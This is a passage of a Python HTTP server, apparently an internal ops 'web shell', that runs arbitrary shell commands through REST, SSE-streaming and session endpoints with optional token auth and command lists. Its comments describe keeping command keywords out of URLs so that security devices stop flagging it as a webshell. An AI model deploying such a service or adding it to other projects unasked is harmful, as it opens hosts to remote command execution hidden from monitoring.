            self._send(200, render_page(), 'text/html; charset=utf-8')
            return
        # 凭券取流：券即凭证（一次性 + 60s + 绑来源 IP），单独校验，不再要求 token，
        # 这样页面 EventSource 的 URL 上不会出现长期令牌。
        ticket_flow = (len(parts) == 2 and parts[0] == 'exec' and parts[1] == 'stream'
                       and self.q('ticket', ''))
        if not ticket_flow and not self._auth_ok():
            return
        if parts[0] == 'ping':
            self._send_json(200, {'status': 'success', 'version': VERSION})
            return
        if parts[0] == 'health':
            self._send_json(200, {
                'status': 'success', 'alive': True,
                'version': VERSION, 'uptime': int(time.time() - START_TIME),
                'pid': os.getpid()
            })
            return
        if parts[0] == 'status':
            self._send_json(200, {
                'status': 'success',
                'hostname': platform.node(),
                'os': platform.system() + ' ' + platform.release(),
                'user': getpass.getuser(),
                'cwd': CWD,
                'allow': sorted(ALLOW_LIST),
                'default_timeout': DEFAULT_TIMEOUT,
                'version': VERSION,
                'uptime': int(time.time() - START_TIME),
            })
            return
        if parts[0] == 'exec' and len(parts) == 2 and parts[1] == 'stream':
            self._exec_stream()
            return
        if parts[0] == 'exec' and len(parts) == 2 and parts[1] == 'start':
            if not self._auth_ok():
                return
            self._exec_start()
            return
        if parts[0] == 'export' and len(parts) == 1:
            self._export()
            return
        if parts[0] == 'sessions':
            if len(parts) == 1:
                self._sessions_list()
                return
            if len(parts) == 3 and parts[2] == 'stream':
                self._session_stream(parts[1])
                return
            self._send_json(404, {'status': 'error', 'message': '接口不存在'})
            return
        self._send_json(404, {'status': 'error', 'message': '接口不存在'})

    def do_POST(self):
        if not self._auth_ok():
            return
        parts = self._path_parts()
        if not parts:
            self._send_json(404, {'status': 'error', 'message': '接口不存在'})
            return
        if parts[0] == 'exec' and len(parts) == 1:
            self._exec_post()
            return
        if parts[0] == 'exec' and len(parts) == 2 and parts[1] == 'stream':
            # 命令在请求体、token 在 X-Auth-Token：URI 上没有任何命令特征
            self._exec_stream_post()
            return
        if parts[0] == 'exec' and len(parts) == 2 and parts[1] == 'start':
            self._exec_start()
            return
        if parts[0] == 'sessions':
            if len(parts) == 1:
                self._sessions_create()
                return
            if len(parts) == 3 and parts[2] == 'exec':
                self._session_exec_post(parts[1])
                return
            if len(parts) == 3 and parts[2] == 'stream':
                # 命令在请求体（URI 上不留命令关键字），与 exec/stream 的 POST 一致
                length = int(self.headers.get('Content-Length') or 0)
                data = self._read_json(length, {})
                if not isinstance(data, dict):
                    data = {}
                self._session_stream(parts[1], data.get('cmd'), data.get('timeout'))
                return
        self._send_json(404, {'status': 'error', 'message': '接口不存在'})

    def do_DELETE(self):
        if not self._auth_ok():
            return
        parts = self._path_parts()
        if parts and parts[0] == 'sessions' and len(parts) == 2:
            self._session_delete(parts[1])
            return
        self._send_json(404, {'status': 'error', 'message': '接口不存在'})

    # ---------- 单次阻塞执行（旧接口，结构不变） ----------
    def _exec_post(self):
        length = int(self.headers.get('Content-Length') or 0)
        data = self._read_json(length, {})
        if not isinstance(data, dict):
            self._send_json(400, {'status': 'error', 'message': '请求体格式错误'})
            return
        cmd = data.get('cmd')
        cmd = cmd.strip() if isinstance(cmd, string_types) else ''
        if not cmd:
            self._send_json(400, {'status': 'error', 'message': '命令不能为空'})
            return
        if len(cmd) > MAX_CMD_LEN:
            self._send_json(400, {'status': 'error', 'message': '命令过长 (>%d)' % MAX_CMD_LEN})
            return
        timeout = clamp_timeout(data.get('timeout'))
        ok, reason = check_policy(cmd)
        if not ok:
            log('[audit] %s | DENIED | %s | %s' % (self.client_address[0], cmd, reason))
            self._send_json(403, {'status': 'error', 'message': reason})
            return
        if not EXEC_SEM.acquire(False):   # py2 不支持 blocking 关键字参数
            self._send_json(503, {'status': 'error',
                                  'message': '当前并发执行过多 (%d)，请稍后重试' % MAX_CONCURRENT_EXEC})
            return
        try:
            result = run_command(cmd, timeout)
        finally:
            EXEC_SEM.release()
        log('[audit] %s | code=%s | %s' % (self.client_address[0], result['code'], cmd))
        self._send_json(200, dict(result, status='success'))

    # ---------- 单次 SSE 实时输出 ----------
    def _exec_start(self):
        """POST /api/exec/start：命令放请求体换一次性 ticket（v1.3.0）。

        浏览器 EventSource 不能自定义请求头，命令行与长期 token 一旦放进 URL，
        URI 就会带上 `cmd=whoami` 这类 webshell 特征被安全设备误报。这里让页面
        先 POST 换票（命令在 body、token 在 X-Auth-Token），随后的 SSE 取流 URI
        上只有一张随机券号。
        """
        length = int(self.headers.get('Content-Length') or 0)
        data = self._read_json(length, {})
        if not isinstance(data, dict):
            self._send_json(400, {'status': 'error', 'message': '请求体格式错误'})
            return
        cmd = data.get('cmd')
        cmd = cmd.strip() if isinstance(cmd, string_types) else ''
        if not cmd:
            self._send_json(400, {'status': 'error', 'message': '命令不能为空'})
            return
        if len(cmd) > MAX_CMD_LEN:
            self._send_json(400, {'status': 'error', 'message': '命令过长 (>%d)' % MAX_CMD_LEN})
            return
        timeout = clamp_timeout(data.get('timeout'))
        ok, reason = check_policy(cmd)
        if not ok:
            log('[audit] %s | DENIED | %s | %s' % (self.client_address[0], cmd, reason))
            self._send_json(403, {'status': 'error', 'message': reason})
            return
        ticket = new_ticket(cmd, timeout, self.client_address[0])
        log('[audit] %s | ticket | timeout=%s | %s' % (self.client_address[0], timeout, cmd))
        self._send_json(200, {'status': 'success', 'ticket': ticket,
                              'ttl': TICKET_TTL, 'timeout': timeout})

    def _exec_stream(self):
        """GET /api/exec/stream：三种形态并存。

        * `?ticket=xxx`            —— 页面推荐路径（URI 无命令、无长期 token）；
        * `?cmd=...&timeout=...`   —— v1.2 旧接口，保留兼容（老平台/老脚本在用）；
        * POST + JSON {cmd,timeout} —— 见 `_exec_stream_post`，供 release_center 等
          API 调用方使用（命令不落 URI）。
        """
        ticket = self.q('ticket', '')
        if ticket:
            cmd, timeout, reason = take_ticket(ticket, self.client_address[0])
            if not cmd:
                self._send_json(403, {'status': 'error', 'message': reason})
                return
            self._exec_stream_run(cmd, timeout)
            return
        cmd = self.q('cmd', '')
        cmd = cmd.strip() if isinstance(cmd, string_types) else ''
        self._exec_stream_run(cmd, self.q('timeout', str(DEFAULT_TIMEOUT)))

    def _exec_stream_post(self):
        """POST /api/exec/stream：命令与超时放 JSON 请求体（v1.3.0）。

        release_center 等 API 调用方用这条：请求 URI 恒为 /api/exec/stream，
        不会再出现带命令关键字的查询串。
        """
        length = int(self.headers.get('Content-Length') or 0)
        data = self._read_json(length, {})
        if not isinstance(data, dict):
            data = {}
        cmd = data.get('cmd')
        cmd = cmd.strip() if isinstance(cmd, string_types) else ''
        self._exec_stream_run(cmd, data.get('timeout'))

    def _exec_stream_run(self, cmd, timeout_raw):
        """执行并流式回传（GET/POST/ticket 三条入口共用的实现）。"""
        if not cmd:
            self._send_json(400, {'status': 'error', 'message': '命令不能为空'})
            return
        if len(cmd) > MAX_CMD_LEN:
            self._send_json(400, {'status': 'error', 'message': '命令过长 (>%d)' % MAX_CMD_LEN})
            return
        timeout = clamp_timeout(timeout_raw)
        ok, reason = check_policy(cmd)
        if not ok:
            self._send_json(403, {'status': 'error', 'message': reason})
            return
        if not EXEC_SEM.acquire(False):
            self._send_json(503, {'status': 'error',
                                  'message': '当前并发执行过多 (%d)，请稍后重试' % MAX_CONCURRENT_EXEC})
            return
        try:
            stream = self._make_sse()
            self._begin_sse(stream)
            stream.json({'cmd': cmd, 'timeout': timeout, 'ts': int(time.time())}, event='start')
            # py2 下 unicode 命令（POST/券入口的 JSON body 会是 unicode）必须先转字节，
            # 否则 subprocess 按 ascii 编码中文命令会抛错（SSE 已发 200，流会中断）。
            proc_cmd = to_bytes(cmd) if (PY2 and isinstance(cmd, text_type)) else cmd
            proc = compat.popen_stream(proc_cmd, cwd=CWD, shell=True)
            q = compat.Queue()

            def _reader():
                try:
                    while True:
                        line = proc.stdout.readline()
                        if not line:
                            break
                        q.put(line)
                except Exception:
                    pass
                try:
                    q.put(None)
                except Exception:
                    pass

            compat.start_daemon(_reader)
            size = 0
            truncated = False
            timed_out = False
            start = time.time()
            while True:
                if stream.closed:
                    compat.kill_process_tree(proc)
                    break
                remaining = timeout - (time.time() - start)
                if remaining <= 0:
                    timed_out = True
                    compat.kill_process_tree(proc)
                    break
                try:
                    raw = q.get(timeout=min(remaining, 1))
                except compat.Empty:
                    continue
                if raw is None:
                    break
                if size + len(raw) > MAX_OUT:
                    truncated = True
                    remain = MAX_OUT - size
                    if remain > 0:
                        stream.send(compat.to_text(raw[:remain]), event='out')
                        size += remain
                    stream.comment('...[输出已截断]')
                    compat.kill_process_tree(proc)
                    break
                size += len(raw)
                stream.send(compat.to_text(raw), event='out')
            try:
                proc.wait()
            except Exception:
                pass
            code = proc.returncode if proc.returncode is not None else -1
            elapsed = round(time.time() - start, 2)
            if not stream.closed:
                stream.json({'returncode': code, 'elapsed': elapsed,
                             'truncated': truncated, 'timed_out': timed_out}, event='exit')
                stream.close()
            log('[audit] %s | stream | code=%s | %s' % (self.client_address[0], code, cmd))
        finally:
            EXEC_SEM.release()

    # ---------- 会话：创建 ----------
    def _sessions_create(self):
        length = int(self.headers.get('Content-Length') or 0)
        data = self._read_json(length, {})
        if not isinstance(data, dict):
            data = {}
        req_cwd = data.get('cwd') if isinstance(data, dict) else None
        if isinstance(req_cwd, string_types) and req_cwd.strip():
            cwd = os.path.abspath(req_cwd)
            if not os.path.isdir(cwd):
                self._send_json(400, {'status': 'error', 'message': 'cwd 目录不存在: %s' % cwd})
                return
        else:
            cwd = CWD
        with SESSIONS_LOCK:
            if len(SESSIONS) >= MAX_SESSIONS:
                self._send_json(503, {'status': 'error',
                                      'message': '会话数已达上限 (%d)' % MAX_SESSIONS})
                return
            sid = compat.rand_hex(8)
            while sid in SESSIONS:
                sid = compat.rand_hex(8)
            s = Session(sid, cwd)
            SESSIONS[sid] = s
        log('[audit] %s | session.create | %s | cwd=%s' % (self.client_address[0], sid, cwd))
        self._send_json(200, {'status': 'success', 'session_id': sid, 'cwd': cwd,
                              'created': int(s.created)})

    # ---------- 会话：列表 ----------
    def _sessions_list(self):
        with SESSIONS_LOCK:
            items = [{'session_id': s.sid, 'cwd': s.cwd, 'created': int(s.created),
                      'last_used': int(s.last_used), 'running': s.running, 'alive': s.alive}
                     for s in SESSIONS.values()]
        items.sort(key=lambda x: x['created'])
        self._send_json(200, {'status': 'success', 'sessions': items,
                              'max': MAX_SESSIONS, 'ttl': SESSION_TTL})

    # ---------- 会话：阻塞执行 ----------
    def _session_exec_post(self, sid):
        with SESSIONS_LOCK:
            s = SESSIONS.get(sid)
        if s is None or not s.alive:
            self._send_json(404, {'status': 'error', 'message': '会话不存在或已关闭'})
            return
        length = int(self.headers.get('Content-Length') or 0)
        data = self._read_json(length, {})
        if not isinstance(data, dict):
            self._send_json(400, {'status': 'error', 'message': '请求体格式错误'})
            return
        cmd = data.get('cmd')
        cmd = cmd.strip() if isinstance(cmd, string_types) else ''
        if not cmd:
            self._send_json(400, {'status': 'error', 'message': '命令不能为空'})
            return
        if len(cmd) > MAX_CMD_LEN:
            self._send_json(400, {'status': 'error', 'message': '命令过长 (>%d)' % MAX_CMD_LEN})
            return
        timeout = clamp_timeout(data.get('timeout'))
        ok, reason = check_policy(cmd)
        if not ok:
            log('[audit] %s | session.denied | %s | %s' % (self.client_address[0], sid, reason))
            self._send_json(403, {'status': 'error', 'message': reason})
            return
        if not EXEC_SEM.acquire(False):
            self._send_json(503, {'status': 'error',
                                  'message': '当前并发执行过多 (%d)，请稍后重试' % MAX_CONCURRENT_EXEC})
            return
        if not s.lock.acquire(False):
            EXEC_SEM.release()
            self._send_json(409, {'status': 'error', 'message': '该会话正在执行命令，请稍后再试'})
            return
        try:
            result = _session_run(self, s, cmd, timeout, sse=None)
        finally:
            s.lock.release()
            EXEC_SEM.release()
        log('[audit] %s | session.exec | %s | code=%s | %s'
            % (self.client_address[0], sid, result.get('returncode'), cmd))
        self._send_json(200, dict(result, status='success'))

    # ---------- 会话：SSE 执行 ----------
    def _session_stream(self, sid, cmd=None, timeout_raw=None):
        """会话内执行并回显（GET 查询串 / POST 请求体共用）。

        cmd 为 None 表示走 GET 查询串（v1.2 旧形态，保留兼容）；POST 入口把命令放
        请求体传入，URL 上不出现命令关键字。
        """
        with SESSIONS_LOCK:
            s = SESSIONS.get(sid)
        if s is None or not s.alive:
            self._send_json(404, {'status': 'error', 'message': '会话不存在或已关闭'})
            return
        if cmd is None:
            cmd = self.q('cmd', '')
            timeout_raw = self.q('timeout', str(DEFAULT_TIMEOUT))
        cmd = cmd.strip() if isinstance(cmd, string_types) else ''
        if not cmd:
            self._send_json(400, {'status': 'error', 'message': '命令不能为空'})
            return
        if len(cmd) > MAX_CMD_LEN:
            self._send_json(400, {'status': 'error', 'message': '命令过长 (>%d)' % MAX_CMD_LEN})
            return
        timeout = clamp_timeout(timeout_raw)
        ok, reason = check_policy(cmd)
        if not ok:
            self._send_json(403, {'status': 'error', 'message': reason})
            return
        if not EXEC_SEM.acquire(False):
            self._send_json(503, {'status': 'error',
                                  'message': '当前并发执行过多 (%d)，请稍后重试' % MAX_CONCURRENT_EXEC})
            return
        if not s.lock.acquire(False):
            EXEC_SEM.release()
            self._send_json(409, {'status': 'error', 'message': '该会话正在执行命令，请稍后再试'})
            return
        try:
            stream = self._make_sse()
            self._begin_sse(stream)
            stream.json({'cmd': cmd, 'timeout': timeout, 'ts': int(time.time()),
                         'session_id': sid}, event='start')
            result = _session_run(self, s, cmd, timeout, sse=stream)
            if not stream.closed:
                stream.json({'returncode': result.get('returncode'),
                             'elapsed': result.get('elapsed'),
                             'truncated': result.get('truncated'),
                             'timed_out': result.get('timed_out'),
                             'cwd': result.get('cwd')}, event='exit')
                stream.close()
            log('[audit] %s | session.stream | %s | code=%s | %s'
                % (self.client_address[0], sid, result.get('returncode'), cmd))
        finally:
            s.lock.release()
            EXEC_SEM.release()

    # ---------- 会话：关闭 ----------
    def _session_delete(self, sid):
        with SESSIONS_LOCK:
            s = SESSIONS.pop(sid, None)
        if s is None:
            self._send_json(404, {'status': 'error', 'message': '会话不存在'})
            return
        s.close()
        log('[audit] %s | session.delete | %s' % (self.client_address[0], sid))
        self._send_json(200, {'status': 'success', 'session_id': sid, 'closed': True})

    # ---------- 结果导出（纯文本下载） ----------
    def _export(self):
        cmd = self.q('cmd', '')
        cmd = cmd.strip() if isinstance(cmd, string_types) else ''
        if not cmd:
            self._send_json(400, {'status': 'error', 'message': '命令不能为空'})
            return
        timeout = clamp_timeout(self.q('timeout', str(DEFAULT_TIMEOUT)))
        ok, reason = check_policy(cmd)
        if not ok:
            self._send_json(403, {'status': 'error', 'message': reason})
            return
        if not EXEC_SEM.acquire(False):
            self._send_json(503, {'status': 'error',
                                  'message': '当前并发执行过多 (%d)，请稍后重试' % MAX_CONCURRENT_EXEC})
            return
        try:
            r = run_command(cmd, timeout)
        finally:
            EXEC_SEM.release()
        out = r['stdout']
        if r['stderr']:
            out = out + ('' if out.endswith('\n') else '\n') + r['stderr']
        body = compat.to_bytes(out)
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.send_header('Content-Disposition', 'attachment; filename="exec_output.txt"')
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(body)


# ================= 会话空闲回收 =================
def _reap_sessions():
    """后台线程：定期回收空闲超时或已失效的会话。"""
    interval = max(5, min(SESSION_TTL // 3, 30))
    while True:
        time.sleep(interval)
        try:
            now = time.time()
            to_kill = []
            with SESSIONS_LOCK:
                for sid, s in SESSIONS.items():
                    if not s.alive or (now - s.last_used) > SESSION_TTL:
                        to_kill.append(sid)
            for sid in to_kill:
                with SESSIONS_LOCK:
                    s = SESSIONS.pop(sid, None)
                if s:
                    s.close()
        except Exception:
            pass


# ================= 入口 =================
_httpd = None


def _signal_handler(signum, frame):
    log("\n收到信号 %s，服务器停止。" % signum)
    remove_pidfile()
    if _httpd:
        # shutdown() 必须从 serve_forever() 之外的线程调用，否则会死锁
        start_daemon(_httpd.shutdown)


def main():
    global _httpd
    write_pidfile()
    start_daemon(_reap_sessions)
    httpd = ThreadingHTTPServer((ARGS.host, ARGS.port), ShellHandler)
    _httpd = httpd
    log('=' * 66)
    log('[WebShell] web_shell.py v%s 已启动' % VERSION)
    log('浏览器访问: http://<服务器IP>:%d' % ARGS.port)
    log('执行目录  : %s' % CWD)
    log('默认超时  : %ds' % DEFAULT_TIMEOUT)
    log('访问令牌  : %s' % ('已开启' if WS_TOKEN else '⚠️ 未开启（任何人可执行命令，仅限受信内网！）'))
    log('命令白名单: %s' % (', '.join(sorted(ALLOW_LIST)) if ALLOW_LIST else '⚠️ 未开启（可执行任意命令）'))
    log('危险黑名单: %s' % (', '.join(DENY_LIST) if DENY_LIST else '已关闭'))
    log('会话上限  : %d，空闲回收: %ds' % (MAX_SESSIONS, SESSION_TTL))
    if PIDFILE:
        log('PID 文件  : %s' % PIDFILE)
    log('=' * 66)
    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()
        remove_pidfile()
        log('\n[WebShell] 已停止。')


if __name__ == '__main__':
    main()
